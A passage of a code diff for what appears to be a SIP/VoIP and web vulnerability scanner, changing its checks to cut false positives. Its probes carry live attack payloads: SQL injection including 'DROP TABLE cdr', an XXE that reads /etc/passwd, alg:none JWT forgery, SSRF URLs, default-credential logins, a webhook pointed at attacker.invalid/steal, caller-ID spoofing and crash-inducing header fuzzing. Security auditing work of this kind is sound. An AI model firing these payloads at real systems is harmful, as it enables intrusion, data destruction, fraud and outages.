-                 "/api/v1/proxy?target=http://127.0.0.1/"]:
+                 "/api/v1/proxy?target=http://127.0.0.1/",
+                 "/api/v1/webhook?url=http://127.0.0.1:8080/"]:
         c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c and re.search(r'admin|root|dashboard|welcome',b,re.I):
-            await st.finding(ip,"SSRF","Server-Side Request Forgery","HIGH",
-                f"SSRF via {path}",f"http://{ip}{path}")
+        # Require confirmation that internal content was returned
+        if c and SSRF_CONFIRM_PATTERNS.search(b):
+            await st.finding(ip,"SSRF","Server-Side Request Forgery — Internal Response Confirmed",
+                "HIGH",
+                f"Internal service response returned via SSRF: {path}",
+                f"http://{ip}{path}")
             return
 
+
 async def _http_jwt_weak(ip,st,sess):
-    """Test API endpoints for weak JWT secrets (none/alg:none attack)."""
     import base64
     def fake_none_jwt(payload:dict) -> str:
         h = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
@@ -952,21 +1250,24 @@ async def _http_jwt_weak(ip,st,sess):
     for path in ["/api/v1/me","/api/me","/api/user","/api/admin"]:
         c,b = await http_get(sess,f"http://{ip}{path}",
                              headers={"Authorization":f"Bearer {token}"},timeout=5)
-        if c==200 and re.search(r'admin|user|role',b,re.I):
+        # Must return 200 AND contain actual user/role data — not just any 200 with "admin" in HTML
+        if c==200 and re.search(r'"(user|username|role|email)"', b, re.I):
             await st.finding(ip,"JWT-ALG-NONE","JWT Algorithm None Attack Succeeded",
-                "CRITICAL","API accepted unsigned JWT token — auth bypass",
+                "CRITICAL","API accepted unsigned JWT token — confirmed auth bypass",
                 f"http://{ip}{path}")
             return
+
 
 async def _http_graphql(ip,st,sess):
     for url in [f"http://{ip}/graphql",f"http://{ip}/api/graphql",f"http://{ip}:8080/graphql"]:
         c,b = await http_get(sess,url,
             data='{"query":"{__schema{types{name}}}"}',
             headers={"Content-Type":"application/json"},timeout=5)
-        if c==200 and "__schema" in b:
+        if c==200 and "__schema" in b and "types" in b:
             await st.finding(ip,"MISCONFIGURATION","GraphQL Introspection Enabled",
                 "MEDIUM","GraphQL schema fully exposed — enumerate all types",url)
             return
+
 
 async def _http_default_creds(ip,st,sess):
     for user,pwd in DEFAULT_CREDS[:20]:
@@ -974,31 +1275,37 @@ async def _http_default_creds(ip,st,sess):
             for path in ADMIN_PATHS[:4]:
                 c,b = await http_get(sess,f"{proto}://{ip}:{port}{path}",
                                      auth=(user,pwd),timeout=6)
-                if c==200 and re.search(r'dashboard|logout|admin|panel|welcome',b,re.I):
-                    await st.finding(ip,"CREDENTIAL","Default HTTP Credentials",
-                        "CRITICAL",f"Accepted {user}:{pwd}",
+                # Must return 200 AND show logged-in indicators — not just any 200
+                if c==200 and re.search(r'(logout|dashboard|welcome|signed.in|panel)',b,re.I) \
+                        and not re.search(r'(login|password|invalid|incorrect)',b,re.I):
+                    await st.finding(ip,"CREDENTIAL","Default HTTP Credentials Accepted",
+                        "CRITICAL",f"Login succeeded with {user}:{pwd}",
                         f"{proto}://{ip}:{port}{path}")
                     return
 
+
 async def _http_patton(ip,st,sess):
     c,b = await http_get(sess,f"http://{ip}/config",timeout=5)
-    if c and re.search(r'patton|smartnode|smartware',b,re.I):
+    if c==200 and re.search(r'patton|smartnode|smartware',b,re.I):
         await st.finding(ip,"CVE-2023-30258","Patton SmartNode Config Exposed",
-            "CRITICAL","SmartNode /config without auth",f"http://{ip}/config")
+            "CRITICAL","SmartNode /config accessible without auth",f"http://{ip}/config")
+
 
 async def _http_audiocodes(ip,st,sess):
     for path in ["/inifile/","/cgi-bin/StatusPage.cgi"]:
         c,b = await http_get(sess,f"http://{ip}{path}",timeout=5)
-        if c and re.search(r'audiocodes|mediapack|mediant',b,re.I):
+        if c==200 and re.search(r'audiocodes|mediapack|mediant',b,re.I):
             await st.finding(ip,"CVE-2019-9202","AudioCodes Interface Exposed",
                 "HIGH",f"AudioCodes at http://{ip}{path}",f"http://{ip}{path}")
             return
 
+
 async def _http_snom(ip,st,sess):
     c,b = await http_get(sess,f"http://{ip}/",timeout=5)
-    if c and re.search(r'snom',b,re.I):
+    if c==200 and re.search(r'snom',b,re.I):
         await st.finding(ip,"CVE-2018-10055","Snom Phone Web Interface Exposed",
             "HIGH","Snom phone config page accessible",f"http://{ip}/")
+
 
 async def _http_broadsoft(ip,st,sess):
     for path in ["/bvview/","/webconfig/","/broadworks/"]:
@@ -1008,21 +1315,23 @@ async def _http_broadsoft(ip,st,sess):
                 "HIGH",f"BroadSoft at https://{ip}{path}",f"https://{ip}{path}")
             return
 
+
 async def _http_broadsoft_webhook(ip,st,sess):
-    """Test BroadSoft webhook injection."""
     payload = json.dumps({"url":"http://attacker.invalid/steal","event":"ALL"})
     for url in [f"https://{ip}/api/v2/users/admin/bwwheelEvents",
                 f"https://{ip}/api/v2/webhooks"]:
         c,b = await http_get(sess,url,data=payload,
                              headers={"Content-Type":"application/json"},timeout=5)
-        if c in (200,201,204):
-            await st.finding(ip,"MISCONFIGURATION","BroadSoft Webhook Injection",
-                "HIGH","Webhook endpoint accepts unauthenticated POST",url)
+        # Require the server actually accepted the webhook (not just any 200)
+        if c in (200,201,204) and re.search(r'(webhook|event|url|id)',b,re.I):
+            await st.finding(ip,"MISCONFIGURATION","BroadSoft Webhook Injection — Accepted",
+                "HIGH","Webhook endpoint accepted unauthenticated POST",url)
             return
+
 
 async def _http_polycom(ip,st,sess):
     c,b = await http_get(sess,f"http://{ip}/",auth=("Polycom","456"),timeout=5)
-    if c and re.search(r'polycom|realpresence',b,re.I):
+    if c==200 and re.search(r'polycom|realpresence',b,re.I):
         await st.finding(ip,"CVE-2019-9222","Polycom Default Credential Polycom:456",
             "HIGH","Accepted Polycom:456",f"http://{ip}/")
     c2,b2 = await http_get(sess,f"http://{ip}/",auth=("PlcmSpIp","PlcmSpIp"),timeout=5)
@@ -1031,14 +1340,17 @@ async def _http_polycom(ip,st,sess):
             "CRITICAL","Hidden PlcmSpIp account — command injection possible",
             f"http://{ip}/")
 
+
 async def _http_kamailio_mi(ip,st,sess):
-    for url in [f"http://{ip}:8080/mi",f"http://{ip}:8000/RPC2"]:
+    for url in [f"http://{ip}:8080/mi",f"http://{ip}:8000/RPC2",f"http://{ip}:8888/mi"]:
         c,b = await http_get(sess,url,
             data='{"jsonrpc":"2.0","method":"core.info","id":1}',
             headers={"Content-Type":"application/json"},timeout=5)
-        if c and re.search(r'kamailio|opensips|version',b,re.I):
+        # Must return actual version/info — not just any response with "version"
+        if c==200 and re.search(r'"id"\s*:\s*1',b) and \
+                re.search(r'(kamailio|opensips|version)',b,re.I):
             await st.finding(ip,"CVE-2022-44877","Kamailio/OpenSIPS MI Exposed — Unauth RCE",
-                "CRITICAL","MI RPC accessible without auth",url)
+                "CRITICAL","MI RPC responded to core.info without authentication",url)
             return
 
 # ══════════════════════════════════════════════════════════
@@ -1069,10 +1381,12 @@ async def phase4_sip(state:State, sem:asyncio.Semaphore):
             safe(_sip_prack_abuse(ip,state),    "prack"),
             safe(_sip_session_id(ip,state),     "session_id"),
             safe(_sip_ws_probe(ip,state),       "ws_probe"),
+            safe(_sip_tls_probe(ip,state),      "tls"),
         )
 
     await asyncio.gather(*[_sem_probe(sem, sip_all, ip) for ip in state.live_ips])
     Con.ok(f"Phase 4 complete — SIP enumeration done on {len(state.live_ips)} hosts")
+
 
 async def _sip_method_fuzz(ip,st):
     for method in SIP_METHODS_ALL:
@@ -1081,36 +1395,45 @@ async def _sip_method_fuzz(ip,st):
         pkt  = sip_msg(method,ip,extra_hdrs=extra)
         resp = await sip_probe(ip,5060,pkt,timeout=5)
         if not resp: continue
+        # REFER accepted: must be 200/202 — means server will route calls without auth
         if method=="REFER" and re.search(r"SIP/2\.0 (200|202)",resp):
             await st.finding(ip,"MISCONFIGURATION","Unauthenticated REFER Accepted","CRITICAL",
                 "Server accepted REFER without auth — toll fraud risk",f"sip://{ip}:5060")
-        if method in ("SUBSCRIBE","NOTIFY") and "200 OK" in resp:
+        # SUBSCRIBE/NOTIFY: only meaningful if 200 OK — not 401/403
+        if method in ("SUBSCRIBE","NOTIFY") and re.search(r"SIP/2\.0 200 OK",resp):
             await st.finding(ip,"MISCONFIGURATION",f"Unauth {method} Accepted","MEDIUM",
-                f"200 OK to unauth {method}",f"sip://{ip}:5060")
-        if method=="MESSAGE" and "200 OK" in resp:
+                f"200 OK to unauthenticated {method}",f"sip://{ip}:5060")
+        # MESSAGE: 200 OK means SMS/IM relay possible without auth
+        if method=="MESSAGE" and re.search(r"SIP/2\.0 200 OK",resp):
             await st.finding(ip,"MISCONFIGURATION","Unauthenticated MESSAGE Accepted","MEDIUM",
                 "SIP MESSAGE (IM) accepted without auth",f"sip://{ip}:5060")
-        if method=="UPDATE" and "200 OK" in resp:
+        # UPDATE: 200 OK means session modification without auth
+        if method=="UPDATE" and re.search(r"SIP/2\.0 200 OK",resp):
             await st.finding(ip,"MISCONFIGURATION","Unauthenticated UPDATE Accepted","MEDIUM",
                 "UPDATE accepted without auth — session modification possible",
                 f"sip://{ip}:5060")
+
 
 async def _sip_version_leak(ip,st):
     resp = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=5)
     if not resp: return
     for line in resp.splitlines():
         if re.match(r"^(Server|User-Agent):",line,re.I):
-            await st.finding(ip,"INFO-DISCLOSURE","SIP Version Header Exposed","LOW",
-                line.strip(),f"sip://{ip}:5060")
+            # Only report if version number is revealed (not just generic name)
+            if re.search(r'\d+\.\d+', line):
+                await st.finding(ip,"INFO-DISCLOSURE","SIP Version Header Exposed","LOW",
+                    line.strip(),f"sip://{ip}:5060")
             return
+
 
 async def _sip_anon_reg(ip,st):
     extra = "To: <sip:anonymous@anonymous>\r\nExpires: 60\r\n"
     pkt   = sip_msg("REGISTER",ip,from_user="anonymous",extra_hdrs=extra)
     resp  = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp:
+    if resp and re.search(r"SIP/2\.0 200 OK",resp):
         await st.finding(ip,"MISCONFIGURATION","Anonymous SIP REGISTER Allowed","HIGH",
             "REGISTER succeeded without credentials",f"sip://{ip}:5060")
+
 
 async def _sip_malformed_via(ip,st):
     raw = (f"OPTIONS sip:{ip} SIP/2.0\r\n"
@@ -1118,42 +1441,66 @@ async def _sip_malformed_via(ip,st):
            f"To: <sip:{ip}>\r\nFrom: <sip:fuzz@scanner>;tag=fuzz\r\n"
            f"Call-ID: fuzz@scanner\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n"
            ).encode()
-    resp = await sip_probe(ip,5060,raw,timeout=5)
-    if resp and "500" in resp:
+    # Send twice to distinguish crash from normal 500 on oversized input
+    resp1 = await sip_probe(ip,5060,raw,timeout=5)
+    resp2 = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=3)
+    if resp1 and "500" in resp1:
         await st.finding(ip,"FUZZING","Oversized Via Header → 500 Error","HIGH",
-            "Potential parsing bug — server crashed on oversized Via",f"sip://{ip}:5060")
+            "Potential parsing bug — server returned 500 on oversized Via header",
+            f"sip://{ip}:5060")
+    elif resp1 and not resp2:
+        # Server crashed and is no longer responding
+        await st.finding(ip,"FUZZING","Oversized Via Header → Server Crash","CRITICAL",
+            "Server stopped responding after oversized Via header — parser crash",
+            f"sip://{ip}:5060")
+
 
 async def _sip_maxfwd_zero(ip,st):
     pkt  = sip_msg("OPTIONS",ip,extra_hdrs="Max-Forwards: 0\r\n")
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp:
-        await st.finding(ip,"MISCONFIGURATION","Max-Forwards: 0 Not Rejected","LOW",
+    # RFC 3261 §8.1.1.6: MUST return 483 Too Many Hops. 200 OK is a misconfiguration.
+    if resp and re.search(r"SIP/2\.0 200 OK",resp):
+        await st.finding(ip,"MISCONFIGURATION","Max-Forwards: 0 Not Rejected (should 483)","LOW",
             "Should return 483 Too Many Hops (RFC 3261 §8.1.1.6)",f"sip://{ip}:5060")
+
 
 async def _sip_large_header(ip,st):
     pkt = sip_msg("REGISTER",ip,
                   extra_hdrs="Contact: <sip:"+"A"*8192+"@scanner>\r\n")
-    resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "500" in resp:
-        await st.finding(ip,"FUZZING","Oversized Contact → 500 Error","HIGH",
+    resp1 = await sip_probe(ip,5060,pkt,timeout=5)
+    resp2 = await sip_probe(ip,5060,sip_msg("OPTIONS",ip),timeout=3)
+    if resp1 and "500" in resp1:
+        await st.finding(ip,"FUZZING","Oversized Contact Header → 500 Error","HIGH",
             "Possible buffer overflow in SIP contact parsing",f"sip://{ip}:5060")
+    elif resp1 and not resp2:
+        await st.finding(ip,"FUZZING","Oversized Contact Header → Server Crash","CRITICAL",
+            "Server unresponsive after oversized Contact header",f"sip://{ip}:5060")
+
 
 async def _sip_null_bytes(ip,st):
     pkt  = sip_msg("OPTIONS",ip,extra_hdrs="X-Custom: null\x00byte\r\n")
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and re.search(r"SIP/2\.0 2\d\d",resp):
+    # Interesting only if server accepted it (200) without 400 Bad Request
+    if resp and re.search(r"SIP/2\.0 200",resp):
         await st.finding(ip,"FUZZING","Null Bytes in SIP Header Accepted","MEDIUM",
-            "Stack processed null bytes in headers",f"sip://{ip}:5060")
+            "Stack processed null bytes in headers without rejection",f"sip://{ip}:5060")
+
 
 async def _sip_route_abuse(ip,st):
-    pkt  = sip_msg("OPTIONS",ip,extra_hdrs="Route: <sip:attacker.invalid;lr>\r\n")
+    pkt  = sip_msg("INVITE",ip,extra_hdrs="Route: <sip:attacker.invalid;lr>\r\n",body=sdp(ip))
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp:
-        await st.finding(ip,"MISCONFIGURATION","Loose Route Header Accepted","MEDIUM",
-            "External Route header accepted — proxy abuse risk",f"sip://{ip}:5060")
+    # Only report if the response includes the Route header forwarded — indicating loose routing
+    if resp and "200 OK" in resp and "attacker.invalid" in resp:
+        await st.finding(ip,"MISCONFIGURATION","Loose Route Header Forwarded to External Host","HIGH",
+            "Server forwarded Route header to attacker.invalid — open proxy risk",
+            f"sip://{ip}:5060")
+    elif resp and "200 OK" in resp:
+        await st.finding(ip,"MISCONFIGURATION","External Route Header Accepted","MEDIUM",
+            "INVITE with external Route accepted — confirm proxy abuse manually",
+            f"sip://{ip}:5060")
+
 
 async def _sip_early_media(ip,st):
-    """183 Session Progress early media abuse — extract SDP from 183."""
     pkt  = sip_msg("INVITE",ip,extra_hdrs="Supported: 100rel\r\n",body=sdp(ip))
     resp = await sip_probe(ip,5060,pkt,timeout=6)
     if resp and "183 Session Progress" in resp and "m=audio" in resp:
@@ -1161,19 +1508,21 @@ async def _sip_early_media(ip,st):
             "183 Session Progress returned SDP — attacker can inject RTP before answer",
             f"sip://{ip}:5060")
 
+
 async def _sip_forking(ip,st):
-    """Test SIP forking — INVITE delivered to multiple endpoints."""
     extra = ("Contact: <sip:fork1@scanner:5061>\r\n"
              "Contact: <sip:fork2@scanner:5062>\r\n")
     pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
     resp = await sip_probe(ip,5060,pkt,timeout=6)
-    if resp and re.search(r"SIP/2\.0 (100|180|183)",resp):
-        await st.finding(ip,"EXPOSURE","SIP Forking Accepted from External Client","LOW",
-            "Server forked INVITE to multiple contacts — confirm authorization",
+    # Only flag on 180/200 — 100 Trying is just acknowledgment and always expected
+    if resp and re.search(r"SIP/2\.0 (180|200)",resp):
+        await st.finding(ip,"EXPOSURE","SIP Forking Accepted — Multiple Contacts Alerted","LOW",
+            "Server forked INVITE to multiple contacts — confirm authorization policy",
             f"sip://{ip}:5060")
 
+
 async def _sip_topology_leak(ip,st):
-    pkt  = sip_msg("OPTIONS",ip)
+    pkt  = sip_probe_pkt = sip_msg("OPTIONS",ip)
     resp = await sip_probe(ip,5060,pkt,timeout=5)
     if not resp: return
     private = re.findall(
@@ -1184,68 +1533,89 @@ async def _sip_topology_leak(ip,st):
         await st.finding(ip,"INFO-DISCLOSURE","Internal IP Topology Exposed via SIP","MEDIUM",
             f"Private IPs leaked: {list(set(private))}",f"sip://{ip}:5060")
 
+
 async def _sip_sqli(ip,st):
-    for payload in ["' OR '1'='1","' OR 1=1--","1; DROP TABLE cdr--"]:
+    """SIP SQL injection — only report if we see actual DB error patterns in response."""
+    for payload in ["' OR '1'='1","1; DROP TABLE cdr--","' UNION SELECT 1,2,3--"]:
         extra = f"From: <sip:{payload}@scanner>;tag={_sid()[:8]}\r\n"
         pkt   = sip_msg("REGISTER",ip,extra_hdrs=extra)
         resp  = await sip_probe(ip,5060,pkt,timeout=5)
-        if resp and re.search(r"SIP/2\.0 (200|401)",resp):
-            await st.finding(ip,"INJECTION","SQL Injection via SIP From Header","HIGH",
-                f"Payload '{payload}' not sanitised — CDR/DB at risk",
+        if resp and DB_ERROR_PATTERNS.search(resp):
+            await st.finding(ip,"INJECTION","SQL Injection via SIP From Header — Error Confirmed",
+                "HIGH",
+                f"Payload '{payload}' triggered DB error in response",
                 f"sip://{ip}:5060")
             return
+        # Secondary check: significant response time difference (>2s) may indicate blind SQLi
+        elif resp:
+            t0 = time.monotonic()
+            sleep_payload = "'; WAITFOR DELAY '0:0:3'--"
+            extra2 = f"From: <sip:{sleep_payload}@scanner>;tag={_sid()[:8]}\r\n"
+            pkt2 = sip_msg("REGISTER",ip,extra_hdrs=extra2)
+            await sip_probe(ip,5060,pkt2,timeout=6)
+            elapsed = time.monotonic()-t0
+            if elapsed >= 2.8:
+                await st.finding(ip,"INJECTION","Blind SQL Injection via SIP — Time-Based Delay","HIGH",
+                    f"Time-based SQLi: response delayed {elapsed:.1f}s on WAITFOR payload",
+                    f"sip://{ip}:5060")
+                return
+
 
 async def _sip_xxe(ip,st):
+    """XXE via SIP NOTIFY — only report if file content appears in response."""
     xml  = ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<pres><note>&xxe;</note></pres>')
     pkt  = sip_msg("NOTIFY",ip,extra_hdrs="Event: presence\r\n",body=xml)
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp:
-        await st.finding(ip,"INJECTION","XXE via SIP NOTIFY Body","HIGH",
-            "Server accepted NOTIFY with XXE payload",f"sip://{ip}:5060")
+    if resp and FILE_READ_PATTERNS.search(resp):
+        await st.finding(ip,"INJECTION","XXE via SIP NOTIFY — /etc/passwd Content Confirmed",
+            "CRITICAL","File content returned via XXE in NOTIFY response",
+            f"sip://{ip}:5060")
+
 
 async def _sip_caller_id_spoof(ip,st):
     extra = ("P-Asserted-Identity: <sip:emergency@psap.invalid>\r\n"
              "P-Preferred-Identity: <sip:911@psap.invalid>\r\nPrivacy: none\r\n")
     pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and re.search(r"SIP/2\.0 (100|180|183|200)",resp):
-        await st.finding(ip,"MISCONFIGURATION","Caller-ID/P-Asserted-Identity Spoofing","HIGH",
-            "Server accepted spoofed P-Asserted-Identity — vishing risk",
+    # Only flag on 180 Ringing or 200 OK — not 100 Trying (which is just ACK)
+    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
+        await st.finding(ip,"MISCONFIGURATION","Caller-ID/P-Asserted-Identity Spoofing Accepted",
+            "HIGH",
+            "Server accepted spoofed P-Asserted-Identity and rang/answered — vishing risk",
             f"sip://{ip}:5060")
 
+
 async def _sip_pcharge_fraud(ip,st):
-    """P-Charge-Info header billing fraud injection."""
     extra = ("P-Charge-Info: <sip:premium-billing@carrier.invalid>\r\n"
-             "P-Asserted-Identity: <sip:free-user@{ip}>\r\n")
+             f"P-Asserted-Identity: <sip:free-user@{ip}>\r\n")
     pkt  = sip_msg("INVITE",ip,extra_hdrs=extra.format(ip=ip),body=sdp(ip))
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and re.search(r"SIP/2\.0 (100|180|183|200)",resp):
+    if resp and re.search(r"SIP/2\.0 (180|183|200)",resp):
         await st.finding(ip,"MISCONFIGURATION","P-Charge-Info Billing Fraud Vector","HIGH",
             "Server accepted P-Charge-Info without validation — billing fraud possible",
             f"sip://{ip}:5060")
 
+
 async def _sip_prack_abuse(ip,st):
     pkt  = sip_msg("PRACK",ip,extra_hdrs="Require: 100rel\r\nRAck: 1 1 INVITE\r\n")
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "200 OK" in resp:
+    if resp and re.search(r"SIP/2\.0 200 OK",resp):
         await st.finding(ip,"MISCONFIGURATION","Out-of-Dialog PRACK Accepted","LOW",
             "PRACK accepted without an existing dialog (RFC 3262)",f"sip://{ip}:5060")
 
+
 async def _sip_session_id(ip,st):
-    """RFC 7989 Session-ID header injection."""
     extra = "Session-ID: aabbccdd00001111aabbccdd00001111;remote=00000000000000000000000000000000\r\n"
     pkt  = sip_msg("OPTIONS",ip,extra_hdrs=extra)
     resp = await sip_probe(ip,5060,pkt,timeout=5)
-    if resp and "Session-ID" in resp:
-        # Check if our injected session-ID is reflected
-        if "aabbccdd" in resp.lower():
-            await st.finding(ip,"INFO-DISCLOSURE","Session-ID Header Reflected","LOW",
-                "RFC 7989 Session-ID echoed — session tracking possible",
-                f"sip://{ip}:5060")
+    if resp and "Session-ID" in resp and "aabbccdd" in resp.lower():
+        await st.finding(ip,"INFO-DISCLOSURE","Session-ID Header Reflected","LOW",
+            "RFC 7989 Session-ID echoed — session tracking possible",
+            f"sip://{ip}:5060")
+
 
 async def _sip_ws_probe(ip,st):
-    """SIP over WebSocket (RFC 7118) — probe WS upgrade on common ports."""
     ws_handshake = (
         f"GET /ws HTTP/1.1\r\nHost: {ip}\r\n"
         "Upgrade: websocket\r\nConnection: Upgrade\r\n"
@@ -1257,9 +1627,52 @@ async def _sip_ws_probe(ip,st):
         resp = await tcp_xfer(ip,port,ws_handshake,timeout=5)
         if resp and b"101 Switching Protocols" in resp and b"sip" in resp.lower():
             await st.finding(ip,"EXPOSURE","SIP over WebSocket (RFC 7118) Enabled","MEDIUM",
-                f"WebSocket SIP upgrade accepted on port {port} — WS-specific attacks apply",
+                f"WebSocket SIP upgrade accepted on port {port}",
                 f"ws://{ip}:{port}/ws")
             return
+
+
+async def _sip_tls_probe(ip,st):
+    """Check if SIP TLS (port 5061) is available and what certificate it presents."""
+    if not await tcp_open(ip, 5061, timeout=3.0):
+        return
+    # Try TLS client hello — if port 5061 is open but not TLS, note plaintext SIP on TLS port
+    try:
+        import ssl
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        loop = asyncio.get_event_loop()
+        def _check():
+            try:
+                s = socket.create_connection((ip, 5061), timeout=4)
+                ss = ctx.wrap_socket(s, server_hostname=ip)
+                cert = ss.getpeercert(binary_form=False)
+                ss.close()
+                return cert
+            except ssl.SSLError as e:
+                return str(e)
+            except Exception:
+                return None
+        result = await asyncio.wait_for(loop.run_in_executor(None, _check), timeout=6)
+        if isinstance(result, str) and "WRONG_VERSION" in result:
+            await st.finding(ip,"MISCONFIGURATION","Port 5061 Open But Not TLS","MEDIUM",
+                "SIP TLS port 5061 is open but not serving TLS — potential misconfiguration",
+                f"tcp://{ip}:5061")
+        elif isinstance(result, dict):
+            # Check for expired or self-signed cert
+            not_after = result.get("notAfter","")
+            if not_after:
+                try:
+                    exp = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
+                    if exp < datetime.utcnow():
+                        await st.finding(ip,"WEAK-CRYPTO",f"SIP TLS Certificate Expired: {not_after}",
+                            "MEDIUM","Expired TLS cert — clients may accept self-signed replacements",
+                            f"tls://{ip}:5061")
+                except Exception:
+                    pass
+    except Exception:
+        pass
 
 # ══════════════════════════════════════════════════════════
 # PHASE 5 — Extension Scanning
@@ -1282,6 +1695,7 @@ async def phase5_extensions(state:State, sem:asyncio.Semaphore):
     await asyncio.gather(*[_sem_probe(sem, scan_ip, ip) for ip in state.live_ips])
     Con.ok(f"Phase 5 complete — {len(state.valid_extensions)} valid extensions found")
 
+
 async def _ext_register_scan(ip,st):
     for ext in EXTENSION_RANGES:
         ext_s = str(ext)
@@ -1290,9 +1704,10 @@ async def _ext_register_scan(ip,st):
         pkt  = sip_msg("REGISTER",ip,extra_hdrs=extra)
         resp = await sip_probe(ip,5060,pkt,timeout=4)
         if not resp: continue
-        if re.search(r"SIP/2\.0 (401|403|200)",resp):
-            code = re.search(r"SIP/2\.0 (\d+)",resp)
-            code_s = code.group(1) if code else "?"
+        code_m = re.search(r"SIP/2\.0 (\d+)",resp)
+        code_s = code_m.group(1) if code_m else "?"
+        # 401/407 = valid extension (auth challenge), 403 = valid but forbidden, 200 = no auth
+        if code_s in ("401","407","403","200"):
             if ext_s not in [e.split(":")[-1] for e in st.valid_extensions]:
                 st.valid_extensions.append(f"{ip}:{ext_s}")
                 Con.info(f"Extension {col(ext_s,'cyan')} @ {ip} — SIP/{code_s}")
@@ -1301,6 +1716,7 @@ async def _ext_register_scan(ip,st):
                     f"Extension {ext_s} REGISTER Without Auth","CRITICAL",
                     "Auth disabled — call hijack possible",f"sip://{ip}:5060/ext={ext_s}")
 
+
 async def _ext_options_enum(ip,st):
     """User enumeration via OPTIONS — 200 vs 404 reveals existence."""
     for ext in [100,101,102,200,201,1000,1001,9999,"admin","reception"]:
@@ -1308,7 +1724,7 @@ async def _ext_options_enum(ip,st):
         pkt  = sip_msg("OPTIONS",ip,to_user=ext_s)
         resp = await sip_probe(ip,5060,pkt,timeout=4)
         if not resp: continue
-        if "200 OK" in resp:
+        if re.search(r"SIP/2\.0 200 OK",resp):
             key = f"{ip}:{ext_s}"
             if key not in st.valid_extensions:
                 st.valid_extensions.append(key)
@@ -1317,28 +1733,32 @@ async def _ext_options_enum(ip,st):
                 "OPTIONS returns 200 for valid user, 404 for invalid",
                 f"sip://{ip}:5060/ext={ext_s}")
 
+
 async def _voicemail_access(ip,st):
     for vext in VOICEMAIL_EXTS:
         extra = (f"To: <sip:{vext}@{ip}>\r\n"
                  f"From: <sip:scanner@scanner>;tag=vm\r\n")
         pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
         resp = await sip_probe(ip,5060,pkt,timeout=5)
-        if resp and "200 OK" in resp:
+        # 200 OK or 183 means voicemail answered
+        if resp and re.search(r"SIP/2\.0 (200|183)",resp):
             await st.finding(ip,"MISCONFIGURATION",
                 f"Voicemail {vext} Reachable Without Auth","HIGH",
-                "Voicemail answered unauth INVITE",f"sip://{ip}:5060/ext={vext}")
+                "Voicemail answered unauthenticated INVITE",f"sip://{ip}:5060/ext={vext}")
+
 
 async def _ivr_bypass(ip,st):
     for ext in ["0","*","#","operator","00","O"]:
         extra = f"To: <sip:{ext}@{ip}>\r\nFrom: <sip:scanner@scanner>;tag=ivr\r\n"
         pkt  = sip_msg("INVITE",ip,extra_hdrs=extra,body=sdp(ip))
         resp = await sip_probe(ip,5060,pkt,timeout=5)
-        if resp and "200 OK" in resp:
+        if resp and re.search(r"SIP/2\.0 (200|183)",resp):
             await st.finding(ip,"MISCONFIGURATION",
                 f"IVR Bypass via Extension '{ext}'","MEDIUM",
                 "Extension answered without auth — IVR bypass",
                 f"sip://{ip}:5060/ext={ext}")
             return
+
 
 async def _vm_pin_brute(ip,st):
     """Brute-force voicemail PIN via DTMF INFO."""
@@ -1352,14 +1772,15 @@ async def _vm_pin_brute(ip,st):
                  f"Content-Type: application/dtmf-relay\r\n")
         pkt = sip_msg("INFO",ip,extra_hdrs=extra,body=dtmf)
         resp = await sip_probe(ip,5060,pkt,timeout=4)
-        if resp and "200 OK" in resp:
+        if resp and re.search(r"SIP/2\.0 200 OK",resp):
             await st.finding(ip,"MISCONFIGURATION","Out-of-Dialog DTMF INFO Accepted","MEDIUM",
                 "Server accepted INFO+DTMF without dialog — PIN harvest risk",
                 f"sip://{ip}:5060")
             return
 
+
 async def _timing_oracle(ip,st):
-    """Timing oracle for user enumeration — valid user should respond faster."""
+    """Timing oracle for user enumeration."""
     times = {}
     for user in ["admin","100","999999"]:
         pkt = sip_msg("REGISTER",ip,from_user=user,
@@ -1394,36 +1815,39 @@ async def phase6_rtp(state:State, sem:asyncio.Semaphore):
         )
 
     await asyncio.gather(*[_sem_probe(sem, rtp_all, ip) for ip in state.live_ips])
-    Con.ok(f"Phase 6 complete — RTP/RTCP tests done")
+    Con.ok("Phase 6 complete — RTP/RTCP tests done")
+
 
 async def _rtcp_probe(ip,st):
     rtcp = b"\x80\xc9\x00\x01\x00\x00\x00\x00"
     for port in RTCP_PORTS:
         resp = await udp_xfer(ip,port,rtcp,timeout=2)
-        if resp:
+        if resp and len(resp)>=8:
             await st.finding(ip,"EXPOSURE",f"RTCP Port {port} Open","LOW",
                 "RTCP responding — session statistics may be exposed",
                 f"udp://{ip}:{port}")
 
+
 async def _rtp_port_range(ip,st):
-    open_cnt = sum([1 async for _ in
-                    _batch_udp_check(ip,RTP_SAMPLE)])
+    open_cnt = 0
+    for p in RTP_SAMPLE:
+        if await udp_alive(ip,p,b"\x00\x00",timeout=1.5):
+            open_cnt += 1
     if open_cnt>=2:
         await st.finding(ip,"EXPOSURE","RTP Port Range Exposed","MEDIUM",
             f"{open_cnt} RTP ports reachable — restrict media range",
             f"udp://{ip}:16384-32767")
 
-async def _batch_udp_check(ip,ports):
-    for p in ports:
-        if await udp_alive(ip,p,b"\x00\x00",timeout=1.5):
-            yield p
 
 async def _srtp_enforce(ip,st):
     pkt  = sip_msg("INVITE",ip,body=sdp(ip,secure=False))
